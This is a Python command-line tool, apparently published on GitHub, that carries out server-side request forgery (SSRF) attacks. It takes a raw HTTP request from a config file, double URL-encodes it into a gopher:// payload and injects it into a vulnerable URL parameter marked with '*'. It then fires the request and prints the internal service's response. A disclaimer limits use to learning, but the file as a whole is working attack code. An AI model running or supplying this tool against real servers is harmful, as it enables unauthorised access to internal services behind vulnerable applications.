#!/usr/bin/python3
# @Мартин.
import sys,argparse,textwrap,requests,re
from loguru import logger
import urllib.parse

Version = "@Мартин. SSRF Tool V1.0.0"
Title='''
************************************************************************************
<免责声明>:本工具仅供学习实验使用,请勿用于非法用途,否则自行承担相应的法律责任
<Disclaimer>:This tool is onl y for learning and experiment. Do not use it for illegal purposes, or you will bear corresponding legal responsibilities
************************************************************************************'''
Logo=f'''
 ███▄ ▄███▓     ██████      ██████     ██▀███       █████▒
▓██▒▀█▀ ██▒   ▒██    ▒    ▒██    ▒    ▓██ ▒ ██▒   ▓██   ▒ 
▓██    ▓██░   ░ ▓██▄      ░ ▓██▄      ▓██ ░▄█ ▒   ▒████ ░ 
▒██    ▒██      ▒   ██▒     ▒   ██▒   ▒██▀▀█▄     ░▓█▒  ░ 
▒██▒   ░██▒   ▒██████▒▒   ▒██████▒▒   ░██▓ ▒██▒   ░▒█░    
░ ▒░   ░  ░   ▒ ▒▓▒ ▒ ░   ▒ ▒▓▒ ▒ ░   ░ ▒▓ ░▒▓░    ▒ ░    
░  ░      ░   ░ ░▒  ░ ░   ░ ░▒  ░ ░     ░▒ ░ ▒░    ░      
░      ░      ░  ░  ░     ░  ░  ░       ░░   ░     ░ ░    
       ░            ░           ░        ░                
                                                          
                Github==>https://github.com/MartinxMax    
                {Version}  '''


def Init_Loger():
    logger.remove()
    logger.add(
        sink=sys.stdout,
        format="<green>[{time:HH:mm:ss}]</green><level>[{level}]</level> -> <level>{message}</level>",
        level="INFO"
    )


class Main_Class():


    def __init__(self,args):
        self.URL=args.URL


    def run(self):
        if "*" in self.URL:
            self.Send_Payload(self.Build_Payload())
        else:
            logger.error("You must fill in the correct parameters")


    def Build_Payload(self):
        with open('Request.conf','r+',encoding='utf-8')as f:
            note = f.read()
        if not note:
            logger.error("Unable to load PAYLOAD")
            return None
        else:
            Head_PAYLOAD = urllib.parse.quote(note).replace("%0A", "%0D%0A")
            Host = re.search(r'^Host:\s*(.*?)$', note,re.MULTILINE).group(1)
            PAYLOAD = "gopher://"+Host+"/_"+urllib.parse.quote(Head_PAYLOAD)
            return PAYLOAD


    def Send_Payload(self,payload=None):
        if payload:
            logger.warning("\n[PAYLOAD]\n" +self.URL.replace("*", payload))
            logger.info("[Try SSRF...]")
            try:
                status = requests.get(self.URL.replace("*", payload),timeout=10)
            except:
                logger.error("Problems with SSRF!")
                return False
            else:
                logger.warning(f"\n[SSRF_RESULT] [Request_Status_Code:{status.status_code}]\n"+status.text)
                return True
        else:
            return False


def main():
    print(Logo,"\n",Title)
    Init_Loger()
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=textwrap.dedent('''
        Example:
            author-Github==>https://github.com/MartinxMax
        Basic usage:
            python3 {MPHP} -url http://xxx.com?a=*
            '''.format(MPHP = sys.argv[0]
                )))
    parser.add_argument('-url', '--URL',default='', help='Target_URL')
    args = parser.parse_args()
    Main_Class(args).run()


if __name__ == '__main__':
    main()